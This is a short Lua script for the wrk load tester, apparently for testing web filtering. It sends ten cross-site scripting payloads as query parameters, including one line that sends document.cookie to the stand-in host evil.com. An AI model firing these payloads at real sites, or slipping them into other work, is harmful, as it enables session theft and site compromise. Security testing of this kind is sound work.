local payloads = {
  "/search?q=<script>alert('xss')</script>",
  "/comment?text=<img src=x onerror=alert(1)>",
  "/page?name=<svg/onload=alert(document.cookie)>",
  "/input?val=\" onfocus=alert(1) autofocus=\"",
  "/form?data=<body onload=alert('xss')>",
  "/view?r=<iframe src=\"javascript:alert(1)\">",
  "/api/submit?content=<script>document.location='http://evil.com/'+document.cookie</script>",
  "/profile?bio=<a href=\"javascript:alert(1)\">click</a>",
  "/post?body=<marquee onstart=alert(1)>",
  "/msg?text=<input onfocus=alert(1) autofocus>"
}
local counter = 0

request = function()
  counter = counter + 1
  local path = payloads[(counter % #payloads) + 1]
  return wrk.format("GET", path, {
    ["User-Agent"] = "Mozilla/5.0",
    ["Accept"] = "text/html"
  })
end
